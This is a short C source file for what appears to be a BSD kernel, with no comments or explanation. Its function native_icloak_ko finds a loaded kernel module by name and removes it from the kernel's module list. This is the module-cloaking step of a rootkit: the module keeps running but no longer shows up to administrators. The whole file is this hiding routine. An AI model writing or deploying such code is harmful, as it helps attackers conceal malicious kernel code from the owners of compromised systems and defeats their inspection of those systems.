#include <sys/module.h>

static module_t *find_kmod(const char *name);

int native_icloak_ko(const char *name) {
	int deleted = 0;
	module_t *mp;

	if (name == NULL) {
		return 1;
	}

	mp = find_kmod(name);

	if (mp != NULL) {
		kernconfig_lock();
		module_count--;
		TAILQ_REMOVE(&module_list, mp, mod_chain);
		deleted = 1;
		kernconfig_unlock();
	}

	return (deleted == 1) ? 0 : 1;
}

static module_t *find_kmod(const char *name) {
	module_t *mp;
	TAILQ_FOREACH(mp, &module_list, mod_chain) {
		if (strcmp(mp->mod_info->mi_name, name) == 0) {
			return mp;
		}
	}
	return NULL;
}


